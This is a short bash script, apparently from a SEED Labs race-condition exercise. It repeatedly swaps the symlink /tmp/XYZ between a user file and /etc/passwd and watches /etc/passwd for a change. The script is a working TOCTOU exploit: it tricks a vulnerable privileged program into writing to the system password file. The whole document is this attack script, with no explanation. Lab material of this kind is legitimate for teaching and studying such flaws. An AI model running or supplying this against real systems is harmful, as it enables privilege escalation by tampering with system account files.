#!/bin/bash

CHECK_FILE="ls -l /etc/passwd"
old=$($CHECK_FILE)
new=$($CHECK_FILE)

touch /home/seed/Desktop/ABC

while [ "$old" == "$new" ]
do
    ln -sf /home/seed/Desktop/ABC /tmp/XYZ
    ln -sf /etc/passwd /tmp/XYZ
    sleep 0.001
    echo "Trying race condition\n"
    new=$($CHECK_FILE)
done
echo "Changed!"
